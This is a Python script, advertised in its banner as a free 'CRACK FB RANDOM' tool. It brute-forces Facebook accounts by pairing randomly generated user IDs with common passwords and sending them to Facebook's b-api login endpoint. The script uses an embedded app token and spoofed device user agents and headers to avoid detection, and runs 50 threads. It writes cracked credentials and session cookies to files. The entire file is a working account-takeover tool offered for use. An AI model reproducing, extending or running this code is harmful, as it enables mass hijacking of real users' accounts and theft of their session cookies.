import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import json

# ========== COLOR CONSTANTS ==========
class Colors:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"
    BG_GRAY = "\033[100m"
    BG_RED = "\033[41m\x1b[1;97m"

# ========== GLOBAL VARIABLES ==========
class Stats:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.errors = 0

stats = Stats()

# ========== USER AGENT GENERATOR ==========
class UserAgentGenerator:
    @staticmethod
    def random_user_agent(connection_type=None, ua_type=None):
        """Generate realistic Facebook user agents"""
        rr = random.randint

        # Android versions
        andro_version = str(rr(5, 14))
        fbav = f"{rr(200,450)}.{rr(0,3)}.0.{rr(1,50)}.{rr(100,400)}"
        chrome_version = f"{rr(87,125)}.0.{rr(4000,6600)}.{rr(40,180)}"

        # Connection types
        cellular_providers = [
            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', 'Tri Indonesia', 'Smartfren',
            'By.U', 'Tsel-PakaiMasker', 'IM3 Ooredoo', 'XL Axiata'
        ]
        wifi_networks = ['WIFI', 'WLAN', 'MyWifi', 'IndiHome', 'Biznet', 'FirstMedia', 'Orbit']
        
        connection_type = connection_type or random.choice(['wifi', 'cellular'])

        if connection_type.lower() == 'wifi':
            fbcr = random.choice(wifi_networks)
            network = random.choice(['WiFi', 'WIFI'])
        else:
            fbcr = random.choice(cellular_providers)
            network = random.choice(['Cellular', 'LTE', 'H+', '4G', '5G'])

        # Device information
        brands = ['Samsung', 'Xiaomi', 'Vivo', 'OPPO', 'Realme', 'Infinix', 'Huawei', 'Asus']
        brand = random.choice(brands)
        
        model_pool = {
            'Samsung': ['SM-G996B', 'SM-A515F', 'SM-G990B', 'SM-A205F', 'SM-M336B'],
            'Xiaomi': ['Redmi Note 8', 'Redmi 9A', 'Redmi 10C', 'Redmi Note 11', 'POCO X3 Pro'],
            'Vivo': ['Vivo 1904', 'Vivo 1938', 'Vivo 2015', 'Vivo Y20', 'Vivo Y16'],
            'OPPO': ['CPH1823', 'CPH1909', 'CPH2083', 'CPH2239', 'CPH2419'],
            'Realme': ['RMX3085', 'RMX2185', 'RMX3263', 'RMX2001', 'RMX2020'],
            'Infinix': ['X6823', 'X689F', 'X665B', 'X688B', 'X6511B'],
            'Huawei': ['ANE-LX2J', 'PRA-LX1', 'STK-L21', 'MAR-LX2', 'YAL-L21'],
            'Asus': ['ASUS_X00TD', 'ASUS_X00HD', 'ASUS_I01WD', 'ASUS_Z01QD']
        }
        model = random.choice(model_pool.get(brand, ['Unknown']))
        
        build = f"{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{rr(1,9)}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}.{rr(111111,999999)}.00{rr(1,9)}"

        # Display/Locale settings
        density = random.choice(['1.0', '1.25', '1.5', '2.0', '2.25', '3.0', '3.25'])
        height = str(rr(720, 2560))
        width = str(rr(360, 1440))
        fblc = random.choice(['en_US', 'id_ID', 'th_TH', 'es_MX', 'fr_FR', 'pt_BR'])
        timezones = ['Asia/Jakarta', 'Asia/Bangkok', 'Asia/Singapore', 'America/New_York']
        tz = random.choice(timezones)
        
        # Facebook app type
        ua_type = ua_type or random.choice(['fb', 'lite', 'messenger', 'browser'])
        
        fb_app_map = {
            'fb': 'FB4A',
            'lite': 'Facebook.lite-Android',
            'messenger': 'Orca-Android',
            'browser': 'Katana-Android'
        }
        fban = fb_app_map.get(ua_type, 'FB4A')

        # App build info
        fbbv = str(rr(111111111, 999999999))
        fbpn = f"com.facebook.{random.choice(['katana', 'orca', 'lite', 'mlite'])}"

        # Construct user agent
        ua = (
            f"Mozilla/5.0 (Linux; Android {andro_version}; {model} Build/{build}; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
            f"Chrome/{chrome_version} Mobile Safari/537.36 "
            f"[FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};"
            f"FBLC/{fblc};FBCR/{fbcr};FBMF/{brand};FBBD/{brand};FBPN/{fbpn};"
            f"FBDV/{model};FBOP/1;FBCA/x86:armeabi-v7a;NetworkType/{network};TimeZone/{tz}]"
        )
        return ua

    @staticmethod
    def random_xiaomi_ua_pro():
        """Generate ultra-realistic Xiaomi user agents"""
        android_versions = [
            "Android 8.1.0", "Android 9", "Android 10", "Android 11",
            "Android 12", "Android 13", "Android 14"
        ]
        
        cpu_arch = random.choice(["arm64-v8a", "armeabi-v7a"])
        
        brands = {
            "Redmi": [
                "Redmi Note 5 Pro", "Redmi Note 6 Pro", "Redmi Note 7", "Redmi Note 7 Pro",
                "Redmi Note 8", "Redmi Note 8 Pro", "Redmi Note 9", "Redmi Note 9 Pro",
                "Redmi Note 10", "Redmi Note 10 Pro", "Redmi Note 11", "Redmi Note 11 Pro",
                "Redmi Note 12", "Redmi Note 12 Pro", "Redmi Note 13", "Redmi Note 13 Pro",
                "Redmi 9A", "Redmi 9C", "Redmi 10", "Redmi 10C",
                "Redmi K20 Pro", "Redmi K40", "Redmi K50", "Redmi K60"
            ],
            "POCO": [
                "POCO F1", "POCO X2", "POCO X3", "POCO X3 Pro", "POCO F2 Pro",
                "POCO F3", "POCO F4", "POCO F5", "POCO M3", "POCO M4 Pro",
                "POCO X4 GT", "POCO X5 Pro 5G"
            ],
            "Mi": [
                "Mi 8", "Mi 9", "Mi 9T Pro", "Mi 10", "Mi 10T Pro", "Mi 11",
                "Mi 11 Lite", "Mi 11 Ultra", "Mi 12", "Mi 12 Pro", "Mi 13"
            ],
            "Xiaomi": [
                "Xiaomi 11T", "Xiaomi 11T Pro", "Xiaomi 12T", "Xiaomi 12 Pro",
                "Xiaomi 13", "Xiaomi 13 Pro", "Xiaomi 14", "Xiaomi 14 Ultra"
            ]
        }

        brand = random.choice(list(brands.keys()))
        model = random.choice(brands[brand])
        android = random.choice(android_versions)

        # Chrome version
        chrome_major = random.randint(115, 130)
        chrome_minor = random.randint(0, 9)
        chrome_build = random.randint(5000, 7000)
        chrome_patch = random.randint(50, 250)
        chrome_version = f"{chrome_major}.{chrome_minor}.{chrome_build}.{chrome_patch}"

        # MIUI build
        build = f"TKQ1.{random.randint(220000, 299999)}.{random.randint(1000, 9999)}"
        miui = random.choice([
            "",
            f"; MIUI/V{random.randint(12, 15)}.0.{random.randint(1, 9)}",
            f"; MIUI-Global/{random.randint(12, 15)}.{random.randint(0, 9)}"
        ])

        # Optional flags
        webview_flag = random.choice(["", "; wv"])
        version_part = random.choice(["", f"Version/{random.randint(4, 6)}.0 "])
        safari_version = random.choice(["537.36", "537.39", "537.40"])
        
        # App signatures
        app_signatures = [
            "", 
            " [FB_IAB/FB4A;FBAV/446.0.0.38.118;]",
            f" [FBAN/EMA;FBLC/en_US;FBBV/510000;FBCR/4G;FBMF/Xiaomi;FBDV/{model};]",
            " [FB_IAB/MESSENGER;FBAV/435.0.0.27.114;]"
        ]
        app_suffix = random.choice(app_signatures)
        
        ua = (
            f"Mozilla/5.0 (Linux; Android {android}; {model} Build/{build}; {cpu_arch}{miui}) "
            f"AppleWebKit/{safari_version} (KHTML, like Gecko){webview_flag} "
            f"{version_part}Chrome/{chrome_version} Mobile Safari/{safari_version}{app_suffix}"
        )
        
        return ua

# ========== UI & DECORATION ==========
class UI:
    @staticmethod
    def line():
        print(f"{Colors.BG_GRAY}{Colors.WHITE}{'═' * 60}{Colors.RESET}")

    @staticmethod
    def banner():
        os.system("clear")
        print(rf"""{Colors.GREEN}
  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$             
 /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$  /$$/             
| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/| $$ /$$/              
| $$      | $$$$$$$/| $$$$$$$$| $$      | $$$$$/               
| $$      | $$__  $$| $$__  $$| $$      | $$  $$               
| $$    $$| $$  \ $$| $$  | $$| $$    $$| $$\  $$              
|  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$             
 \______/ |__/  |__/|__/  |__/ \______/ |__/  \__/             

 /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  /$$      /$$
| $$__  $$ /$$__  $$| $$$ | $$| $$__  $$ /$$__  $$| $$$    /$$$
| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$| $$  \ $$| $$$$  /$$$$
| $$$$$$$/| $$$$$$$$| $$ $$ $$| $$  | $$| $$  | $$| $$ $$/$$ $$
| $$__  $$| $$__  $$| $$  $$$$| $$  | $$| $$  | $$| $$  $$$| $$
| $$  \ $$| $$  | $$| $$\  $$$| $$  | $$| $$  | $$| $$\  $ | $$
| $$  | $$| $$  | $$| $$ \  $$| $$$$$$$/|  $$$$$$/| $$ \/  | $$
|__/  |__/|__/  |__/|__/  \__/|_______/  \______/ |__/     |__/

    [✔] CRACK FB RANDOM - UPGRADED VERSION
    [∆] WHATSAPP : 082121348660
    [!] FREE TOOL
    [~] BY VARKCOZERY
    [◉⁠‿⁠◉] VERSION: 2.0 UPDATE
""")

    @staticmethod
    def progress_bar(current, total, bar_length=40):
        percent = float(current) * 100 / total
        arrow = '█' * int(percent / 100 * bar_length)
        spaces = '░' * (bar_length - len(arrow))
        return f'{Colors.CYAN}[{arrow}{spaces}] {percent:.1f}%{Colors.RESET}'

# ========== CRACKING FUNCTION ==========
class FacebookCracker:
    def __init__(self):
        self.ua_gen = UserAgentGenerator()
        self.password_list = [
            "123456", "12345678", "123456789", "12345", "1234567",
            "password", "123123", "111111", "qwerty", "abc123",
            "password1", "1234", "iloveyou", "admin", "000000"
        ]

    def get_headers(self):
        """Generate realistic headers for Facebook API"""
        ua_type = random.choice(['fb', 'lite', 'messenger'])
        ua = self.ua_gen.random_user_agent(ua_type=ua_type)
        
        return {
            "x-fb-connection-bandwidth": str(random.randint(20000000, 40000000)),
            "x-fb-sim-hni": str(random.randint(20000, 40000)),
            "x-fb-net-hni": str(random.randint(20000, 40000)),
            "x-fb-connection-quality": random.choice(["EXCELLENT", "GOOD", "FAIR"]),
            "x-fb-connection-type": random.choice([
                "cell.CTRadioAccessTechnologyHSDPA",
                "cell.CTRadioAccessTechnologyLTE",
                "cell.CTRadioAccessTechnologyEdge",
                "wifi"
            ]),
            "user-agent": ua,
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger",
            "accept-encoding": "gzip, deflate",
            "x-fb-client-ip": "true",
            "x-fb-server-cluster": "true"
        }

    def crack_account(self, uid, total):
        """Attempt to crack a single account"""
        global stats
        
        for password in self.password_list:
            try:
                headers = self.get_headers()
                
                url = (
                    "https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={password}"
                    "&credentials_type=device_based_login_password"
                    "&generate_session_cookies=1"
                    "&error_detail_type=button_with_disabled"
                    "&source=device_based_login"
                    "&method=GET&locale=en_US"
                    "&client_country_code=US"
                    "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    "&fb_api_req_friendly_name=authenticate&cpl=true"
                )

                response = requests.get(url, headers=headers, timeout=15)
                data = response.json()

                if "session_key" in data:
                    cookie = ";".join(f"{i['name']}={i['value']}" for i in data["session_cookies"])
                    stats.oks.append(uid)
                    
                    print(f"\r{Colors.GREEN}[SUCCESS] ID: {uid} | Password: {password}{Colors.RESET}")
                    print(f"{Colors.CYAN}Cookies: {cookie}{Colors.RESET}")
                    
                    with open("success.txt", "a") as f:
                        f.write(f"{uid}|{password}|{cookie}\n")
                    return True

                elif "error_msg" in data and "www.facebook.com" in data["error_msg"]:
                    stats.cps.append(uid)
                    print(f"\r{Colors.YELLOW}[CHECKPOINT] ID: {uid} | Password: {password}{Colors.RESET}")
                    
                    with open("checkpoint.txt", "a") as f:
                        f.write(f"{uid}|{password}\n")
                    return True

            except requests.exceptions.ConnectionError:
                time.sleep(5)
            except requests.exceptions.Timeout:
                stats.errors += 1
            except Exception as e:
                stats.errors += 1

        stats.loop += 1
        return False

    def update_progress(self, total):
        """Update progress display"""
        sys.stdout.write(
            f"\r{Colors.BG_RED}[CRACK]{Colors.RESET} "
            f"{Colors.GREEN}[{stats.loop}/{total}] {Colors.GREEN}OK:{len(stats.oks)} "
            f"{Colors.YELLOW}CP:{len(stats.cps)} {Colors.RED} "
            f"{UI.progress_bar(stats.loop, total)}"
        )
        sys.stdout.flush()

# ========== MAIN APPLICATION ==========
def main():
    cracker = FacebookCracker()
    UI.banner()
    
    print(f"{Colors.YELLOW}ᯓ➤ TARGET OPTIONS : 10000 / 20000 / 90000{Colors.RESET}")
    UI.line()
    
    try:
        limit = int(input(f"{Colors.GREEN}╰⪼ ENTER TARGET COUNT : {Colors.CYAN}"))
    except ValueError:
        print(f"{Colors.RED}Invalid input! Please enter a number.{Colors.RESET}")
        return
    
    if limit <= 0:
        print(f"{Colors.RED}Please enter a positive number!{Colors.RESET}")
        return

    UI.line()

    # Generate user IDs
    prefixes = ["100000", "100001", "100002", "100003"]
    user_ids = [
        random.choice(prefixes) + str(random.randint(111111111, 999999999)) 
        for _ in range(limit)
    ]

    print(f"{Colors.GREEN}☛ TOTAL TARGETS: {Colors.WHITE}{limit}{Colors.RESET}")
    print(f"{Colors.GREEN}╰› METHOD: {Colors.CYAN}B-API METHOD{Colors.RESET}")
    print(f"{Colors.GREEN}╰› THREADS: {Colors.CYAN}50{Colors.RESET}")
    UI.line()

    print(f"{Colors.MAGENTA}Starting cracking process...{Colors.RESET}")
    time.sleep(2)

    # Start cracking with thread pool
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for uid in user_ids:
            future = executor.submit(cracker.crack_account, uid, limit)
            futures.append(future)
            
            # Update progress periodically
            if len(futures) % 10 == 0:
                cracker.update_progress(limit)
                time.sleep(0.1)

        # Wait for all tasks to complete
        for future in futures:
            future.result()
            cracker.update_progress(limit)

    end_time = time.time()
    execution_time = end_time - start_time

    UI.line()
    print(f"{Colors.GREEN}PROCESS COMPLETED!{Colors.RESET}")
    print(f"{Colors.WHITE}Execution Time: {Colors.CYAN}{execution_time:.2f} seconds{Colors.RESET}")
    print(f"{Colors.WHITE}Successful: {Colors.GREEN}{len(stats.oks)}{Colors.RESET}")
    print(f"{Colors.WHITE}Checkpoint: {Colors.YELLOW}{len(stats.cps)}{Colors.RESET}")
    UI.line()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Process interrupted by user.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}Unexpected error: {e}{Colors.RESET}")